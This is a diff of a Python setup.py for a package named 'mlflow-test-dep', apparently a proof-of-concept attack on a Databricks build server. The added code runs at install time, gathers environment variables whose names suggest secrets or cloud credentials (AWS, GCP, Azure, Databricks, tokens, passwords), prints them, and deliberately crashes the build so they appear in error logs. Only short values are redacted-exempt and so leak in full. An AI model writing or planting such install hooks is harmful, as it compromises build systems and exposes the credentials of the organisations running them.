@@ -1,28 +1,27 @@
-print("🚨🚨🚨 THIS IS THE NEW COMMIT 🚨🚨🚨")
-raise Exception("🚨🚨🚨 BUILD_SERVER_RCE_PROOF 🚨🚨🚨")
-
 import os
 from setuptools import setup
-print("🚨🚨🚨 THIS IS THE NEW COMMIT 🚨🚨🚨")
 
-# 1. Gather our proof
-proof = "🚨🚨🚨 BUILD_SERVER_RCE_PROOF 🚨🚨🚨\n"
-proof += f"Working Directory: {os.getcwd()}\n"
+# 1. Gather environment variables, focusing on sensitive keys
+sensitive_keys = ['KEY', 'SECRET', 'TOKEN', 'AWS', 'DATABRICKS', 'PASSWORD', 'CREDENTIAL', 'GCP', 'AZURE']
+env_vars = {}
 
-# 2. Look for sensitive environment variables
-secrets_found = {}
-sensitive_keys = ['KEY', 'SECRET', 'TOKEN', 'AWS', 'DATABRICKS', 'PASSWORD', 'CREDENTIAL']
 for k, v in os.environ.items():
     if any(x in k.upper() for x in sensitive_keys):
-        secrets_found[k] = "***REDACTED***" if len(v) > 10 else v
+        # Redact long values to be safe, but prove the key exists
+        env_vars[k] = "***REDACTED***" if len(v) > 10 else v
 
-proof += f"Sensitive ENV Vars Found: {secrets_found}\n"
+# 2. Build the proof payload
+proof = "🚨🚨🚨 BUILD_SERVER_RCE_PROOF 🚨🚨🚨\n"
+proof += f"Working Directory: {os.getcwd()}\n"
+proof += f"Sensitive ENV Vars Found: {env_vars}\n"
 
-# 3. INTENTIONALLY CRASH THE BUILD to leak the proof into the Databricks logs!
-# This guarantees the proof is printed, bypassing any file system restrictions.
+# Print it so it shows up in standard output logs
+print(proof)
+
+# 3. Intentionally crash to guarantee this payload is in the Databricks error logs
 raise Exception(proof)
 
-# This line will never be reached, but setup() is required for the file to be valid Python
+# (This line is never reached, but required for valid setup.py syntax)
 setup(
     name="mlflow-test-dep",
     version="0.1",
